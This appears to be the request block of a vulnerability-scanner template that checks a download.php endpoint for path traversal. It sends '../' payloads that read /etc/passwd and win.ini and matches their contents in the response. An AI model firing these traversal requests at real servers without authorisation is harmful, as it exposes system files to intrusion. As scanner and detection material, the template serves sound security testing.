http:
  - method: GET
    path:
      - "{{BaseURL}}/download.php?file=../../../../../etc/passwd"
      - "{{BaseURL}}/download.php?file=../../../../../c:/windows/win.ini"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200